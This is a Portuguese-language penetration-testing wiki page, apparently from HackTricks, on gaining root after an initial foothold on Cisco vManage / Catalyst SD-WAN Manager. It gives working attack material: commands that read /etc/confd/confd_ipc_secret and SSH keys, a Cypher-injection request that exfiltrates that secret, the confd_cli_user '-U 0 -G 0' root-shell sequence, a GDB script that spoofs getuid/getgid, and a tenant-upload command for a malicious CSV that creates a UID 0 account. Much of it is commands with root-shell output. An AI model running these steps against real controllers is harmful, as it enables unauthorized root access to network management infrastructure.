# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Depois de obter code execution no Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin` ou `vmanage-admin`, as superfícies locais de privesc mais interessantes geralmente são a stack de CLI do `confd`, o helper `cmdptywrapper`, as REST APIs de localhost e os handlers de import/upload pertencentes ao root.

Se você ainda precisar do **initial foothold** em um controller, consulte primeiro a página dedicada ao control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Triagem local rápida
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Se `/etc/confd/confd_ipc_secret` puder ser lido a partir do seu foothold, o Path 1 e o Path 2 tornam-se imediatamente viáveis. Se você chegar por meio de uma divulgação remota de arquivos ou de um webshell, inspecione também o material SSH de `vmanage-admin` e os handlers de upload de multitenancy; pesquisas recentes demonstraram que ambos são pivôs viáveis.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

A avaliação do vManage pela Synacktiv documenta este caminho para um root-shell.<sup>[[5]](#references)</sup>

A [documentação do ConfD](http://66.218.245.39/doc/html/rn03re18.html) vinculada pelo relatório descreve a autenticação IPC; o exemplo de vManage coloca o secret em `/etc/confd/confd_ipc_secret` e mostra que ele pode ser lido por `vmanage`.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Como o Neo4j é executado com privilégios de `vmanage` na configuração relatada, a `Cypher injection` anterior pode ler o arquivo secreto.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` por si só não aceita argumentos de linha de comando; ele invoca `/usr/bin/confd_cli_user`. O workflow relatado extrai esse helper legível pelo root do rootfs, copia-o via `scp`, lê sua ajuda, define `CONFD_IPC_ACCESS_FILE` e o chama com `-U 0 -G 0` para obter um shell root.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Caminho 2

Esta rota alternativa é adaptada da pesquisa da Walmart Global Tech sobre o vManage 19.2.2.<sup>[[6]](#references)</sup>

O caminho da Synacktiv precisa de uma cópia de `/usr/bin/confd_cli_user`, que pode ser lida por root na configuração reportada; o relatório da Walmart, por outro lado, altera os valores de identidade de `confd_cli` no GDB.<sup>[[5]](#references)[[6]](#references)</sup>

A desmontagem do relatório mostra `confd_cli` coletando o UID e o GID do chamador.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump mostrando a coleta de UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
O mesmo teste mostrou um `cmdptywrapper` de propriedade do root recebendo valores explícitos para `-g` e `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
O pesquisador inferiu que `confd_cli` encaminha o UID e o GID do usuário autenticado para `cmdptywrapper`.<sup>[[6]](#references)</sup>

Executar `cmdptywrapper` diretamente com `-g 0 -u 0` falhou porque o file descriptor necessário (`-i 1015` no exemplo) não estava disponível.<sup>[[6]](#references)</sup>

Como `confd_cli` não expõe esses valores como argumentos, o relatório usa o GDB para substituir os valores de retorno de `getuid()` e `getgid()`; o GDB estava presente nesse dispositivo.<sup>[[5]](#references)[[6]](#references)</sup>

Com acesso ao `vmanage`, o teste pôde ler `/etc/confd/confd_ipc_secret`; o script a seguir força ambas as chamadas de identidade a retornarem zero.<sup>[[6]](#references)</sup>

O script do GDB usado no relatório é:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
A saída do console reportada é:<sup>[[6]](#references)</sup>

<details>
<summary>Saída do console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (bug de validação de entrada da CLI de 2025 - CVE-2025-20122)

A Cisco documentou posteriormente um caminho local mais simples para root em seu próprio advisory sobre [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). Um **atacante autenticado com apenas privilégios de somente leitura** poderia enviar uma requisição criada à CLI do manager e obter root devido à validação insuficiente da entrada.<sup>[[7]](#references)</sup>

De uma perspectiva ofensiva, esse advisory e a pesquisa anterior sobre a CLI sugerem o seguinte workflow.<sup>[[6]](#references)[[7]](#references)</sup>

1. Assim que você obtiver *qualquer* foothold com privilégios baixos no equipamento, teste o serviço de CLI local antes de iniciar o workflow mais pesado do Path 1 / Path 2.
2. Reutilize os artefatos do Path 2 para encontrar o limite de confiança: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Trate todos os campos encaminhados ao backend da CLI como suspeitos: UID/GID, nome de usuário, metadados do terminal, arquivos importados ou qualquer valor posteriormente consumido por um helper pertencente ao root.
4. Se um usuário com poucos privilégios puder acessar o socket local da CLI e influenciar esses campos, o root pode estar a apenas uma requisição criada de distância.

Após obter acesso ao appliance, inspecione a cadeia da CLI local da seguinte forma.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Isso transforma o bug de 2025 em um hunting pattern reutilizável: procure **local CLI shims que coletam a identidade em userland e a encaminham para um wrapper privilegiado**.<sup>[[6]](#references)[[7]](#references)</sup>

Não confunda **CVE-2025-20122** com a posterior **CVE-2026-20122**: o problema de 2025 é um bug *local* de CLI para root, enquanto o problema de 2026 é uma sobrescrita arbitrária de arquivo via API *remota*, principalmente útil para plantar um foothold e depois revisitar Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (REST API local de low-priv a root - CVE-2026-20126)

O advisory da Cisco de fevereiro de 2026 descreve outra classe útil de privesc, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). Um **atacante local autenticado com low privileges** poderia obter root devido a um mecanismo insuficiente de autenticação de usuários na REST API.<sup>[[1]](#references)</sup>

Isso é importante porque a privesc no vManage não se limita mais ao abuso de `confd`/TTY; após obter um shell com low privileges, procure também o seguinte.<sup>[[1]](#references)</sup>

- endpoints de API acessíveis apenas via localhost que confiam demais no caller
- tokens, cookies ou credenciais de serviços legíveis pela conta atual
- ações exclusivas de root expostas por handlers `dataservice`/REST que ainda podem ser acionadas localmente

Na prática, assim que você tiver um shell como `vmanage` ou outro service user, o abuso de API local pode ser mais fácil de automatizar do que o abuso de CLI interativo.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Se o contexto da sessão local for suficiente para acessar funcionalidades REST privilegiadas, prefira o caminho da API: é mais fácil de reproduzir, automatizar e encadear com web sessions ou API tokens roubados.<sup>[[1]](#references)</sup>

## Caminho 5 (arquivo crafted de 2026 processado por root - CVE-2026-20245)

Outro padrão recente é o [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Um atacante local com privilégios `netadmin` poderia fazer upload de um **arquivo crafted** que a CLI posteriormente processava de forma insegura, levando à command injection como `root`.<sup>[[2]](#references)</sup>

Do ponto de vista do HackTricks, a técnica valiosa é mais ampla do que o CVE específico.<sup>[[2]](#references)</sup>

1. Enumere todos os workflows de CLI ou web que aceitam um arquivo: imports, diagnostic bundles, templates, validators, backups, tenant data etc.
2. Rastreie onde o arquivo enviado é armazenado e qual script ou binário pertencente a `root` o processa.
3. Teste se o filename, o conteúdo do arquivo ou os metadados analisados são passados em algum momento para comandos shell, wrapper scripts ou helpers no estilo `system()`.
4. Se você já consegue acessar `netadmin` (credenciais válidas, sessão roubada ou uma cadeia de auth-bypass), bugs de processamento de arquivos geralmente são o caminho mais rápido para obter `root`.

Posteriormente, o Google Cloud / Mandiant demonstrou uma instância concreta dessa classe de bug sendo explorada pelo caminho de importação de multitenancy.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
No ataque observado, o CSV criado modificou `/etc/passwd` e `/etc/shadow` para criar uma conta temporária com UID 0 (`troot`). Isso torna os importadores no estilo `tenant-upload` / `tenant-list` especialmente interessantes: eles não são apenas recursos de ingestão de dados, mas possíveis front-ends de parsers executados como root.<sup>[[4]](#references)</sup>

Um padrão rápido de busca no shell é:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Essa classe de bug combina especialmente bem com footholds remotos que concedem `netadmin`, mas não `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Outras vulnerabilidades recentes do vManage/Catalyst SD-WAN Manager para encadear

- **Info leak não autenticado (CVE-2026-20133)** – Especialmente valioso porque pesquisas públicas mostraram que ele poderia expor `confd_ipc_secret` ou a chave privada de `vmanage-admin`, transformando um bug de leitura em Path 1 ou em um pivot NETCONF.<sup>[[3]](#references)</sup>
- **Sobrescrita arbitrária de arquivos via API autenticada (CVE-2026-20122)** – Diferente do bug de CLI de 2025 acima; a VulnCheck usou-o para fazer upload de um webshell, o que torna os caminhos locais de privesc desta página imediatamente relevantes.<sup>[[3]](#references)</sup>
- **XSS autenticado na UI (CVE-2024-20475)** – Um atacante autenticado pode executar script na interface web de um usuário afetado; avalie se o contexto de sessão resultante expõe ações de API/CLI que alcançam `vshell` ou um dos caminhos locais de privesc acima.<sup>[[9]](#references)</sup>
- **Auth bypass remoto para `netadmin` (CVE-2026-20129)** – Precursor muito forte para o Path 5, porque `netadmin` é exatamente o nível exigido pelo privesc de 2026 baseado em arquivo criado.<sup>[[2]](#references)[[3]](#references)</sup>
- **Escrita arbitrária de arquivos autenticada (CVE-2026-20262)** – Valor ofensivo semelhante ao do CVE-2026-20122, mas por meio de um caminho posterior de upload na web UI; a Cisco afirma que um arquivo criado ou sobrescrito pelo bug poderia ser usado posteriormente para elevar privilégios para root.<sup>[[10]](#references)</sup>
- **Downgrade para ressuscitar o privesc antigo de CLI (CVE-2022-20775)** – Intrusões de 2026 mostraram que atacantes podem reverter para uma versão antiga e vulnerável do SD-WAN, explorar o antigo bug de root na CLI e depois restaurar a versão original.<sup>[[8]](#references)</sup>
- **Auth bypass do control-plane pré-auth (CVE-2026-20182)** – Mais bem documentado na página dedicada ao control-plane do SD-WAN; ele pode adicionar uma chave SSH para `vmanage-admin`, fornecendo acesso NETCONF persistente para ações subsequentes no management-plane.<sup>[[11]](#references)</sup>



## References

- [1] [Vulnerabilidades do Cisco Catalyst SD-WAN (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Vulnerabilidade de escalonamento de privilégios autenticado no Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager e Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Vulnerabilidades recentes do Cisco SD-WAN Manager](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Exploração zero-day da vulnerabilidade (CVE-2026-20245) no Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting do Cisco SD-WAN Parte 1: Atacando o vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking do Cisco SD-WAN vManage 19.2.2 — De CSRF a Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Vulnerabilidade de escalonamento de privilégios do Cisco Catalyst SD-WAN Manager (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Exploração ativa do Cisco Catalyst SD-WAN pelo UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Vulnerabilidade de Cross-Site Scripting do Cisco Catalyst SD-WAN Manager (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Vulnerabilidade de escrita arbitrária de arquivos do Cisco Catalyst SD-WAN Manager (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Auth bypass crítico no Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
